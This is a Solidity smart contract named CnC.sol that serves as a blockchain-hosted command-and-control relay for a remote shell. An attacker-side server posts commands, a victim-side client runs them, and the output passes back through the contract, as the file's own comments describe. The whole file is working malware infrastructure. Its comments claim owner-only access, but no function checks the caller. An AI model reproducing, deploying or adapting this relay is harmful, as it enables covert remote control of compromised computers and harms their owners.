// SPDX-License-Identifier: UNLICENCED
// Name        : CnC.sol
// Date        : 5.3.2022
// Author      : Shakedash
// Description : This contract will be the mediator between the RBCS_Server.py and RBCS_Client.py.
//               It will save the commands and command's outputs and let both sides see them.

pragma solidity ^0.6.0;

contract Shell {
    uint256 isCommandReady;
    uint256 isOutputReady;
    address owner;
    string command = "";
    string output = "";

    // constractor() gets called when the contract deploys.
    constructor() public {
        owner = msg.sender;
        isCommandReady = 1; // isCommandReady is true so the client will push his shell output first and then the attacker will be able to start sending commands.
        isOutputReady = 0; // isOutputReady is false so the attacker wont be able to send commands before a victim connects.
    }

    // SetCommand() gets a string and put it in "command" variable, for the client to run.
    // Also sets isCommandReady to true, isOutputReady to false and clear output var.
    // SetCommand() can only be called by owner.
    function SetCommand(string memory command_) public {
        isOutputReady = 0;
        output = "";
        command = command_;
        isCommandReady = 1;
    }

    // GetCommand() return the command requested (by the attacker) to the client.
    function GetCommand() public view returns (string memory) {
        return command;
    }

    // SetOutput() gets a string and puts it "output" variable.
    // Also sets isOutputReady to true and isCommandReady to false.
    function SetOutput(string memory output_) public {
        isCommandReady = 0;
        output = output_;
        isOutputReady = 1;
    }

    // GetOutput() return the command output.
    // GetOutput can only be called by owner.
    function GetOutput() public view returns (string memory) {
        return output;
    }

    // Reset() resets all of the variables so the shell can start to function properly (after a previous run of the program).
    // Reset() can only be called by owner.
    function Reset() public {
        command = "";
        output = "";
        isCommandReady = 1; // isCommandReady is true so the client will push his shell output first and then the attacker will be able to start sending commands.
        isOutputReady = 0; // isOutputReady is false so the attacker wont be able to send commands before a victim connects.
    }

    // GetisCommandReady returns isOutputReady.
    function GetisCommandReady() public view returns (uint256) {
        return isCommandReady;
    }

    // GetisOutputReady returns isOutputReady.
    function GetisOutputReady() public view returns (uint256) {
        return isOutputReady;
    }
}
